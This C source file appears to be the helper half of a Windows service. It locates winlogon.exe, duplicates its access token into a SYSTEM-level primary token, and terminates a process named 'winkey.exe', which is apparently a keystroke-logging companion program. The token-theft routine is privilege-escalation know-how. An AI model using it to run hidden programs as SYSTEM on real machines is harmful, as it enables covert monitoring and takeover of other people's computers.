#include "svc.h"

static BOOL get_winlogon_pid(DWORD *pProcessId)
{
	// Snapshot all running processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	// Look for "winlogon.exe" in the snapshot
	if (Process32First(snapshot, &pe))
	{
		do
		{
			if (_tcsicmp(pe.szExeFile, _T("winlogon.exe")) == 0)
			{
				*pProcessId = pe.th32ProcessID;
				CloseHandle(snapshot);
				return TRUE;
			}
		} while (Process32Next(snapshot, &pe));
	}

	CloseHandle(snapshot);
	return FALSE;
}

HANDLE get_winlogon_duptoken(void)
{
	DWORD winlogon_pid = 0;
	if (!get_winlogon_pid(&winlogon_pid))
	{
		return NULL;
	}

	// Open the winlogon process
	HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogon_pid);
	if (!process)
	{
		return NULL;
	}

	// Retrieve its access token
	HANDLE token;
	if (!OpenProcessToken(process, TOKEN_ALL_ACCESS, &token))
	{
		CloseHandle(process);
		return NULL;
	}

	// Duplicate the token into a primary token
	HANDLE dup_token;
	if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dup_token))
	{
		CloseHandle(token);
		CloseHandle(process);
		return NULL;
	}

	CloseHandle(token);
	CloseHandle(process);
	return dup_token;
}

void kill_winkey_process(void)
{
	// Snapshot all processes
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Look for "winkey.exe"
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return;
	}

	DWORD dwDesiredProcessId = 0;
	do
	{
		if (strcmp(pe32.szExeFile, "winkey.exe") == 0)
		{
			dwDesiredProcessId = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);

	// Terminate "winkey.exe" if found
	if (dwDesiredProcessId != 0)
	{
		HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwDesiredProcessId);
		if (hProcess)
		{
			TerminateProcess(hProcess, 0);
			CloseHandle(hProcess);
		}
	}
}

void print_error(const char *msg)
{
	DWORD err = GetLastError();
	LPSTR error_text = NULL;

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
			FORMAT_MESSAGE_FROM_SYSTEM |
			FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		err,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPSTR)&error_text,
		0,
		NULL);

	fprintf(stderr, "%s\n", msg);
	if (error_text)
	{
		fprintf(stderr, "Reason: (%lu) %s", err, error_text);
		LocalFree(error_text);
	}
}
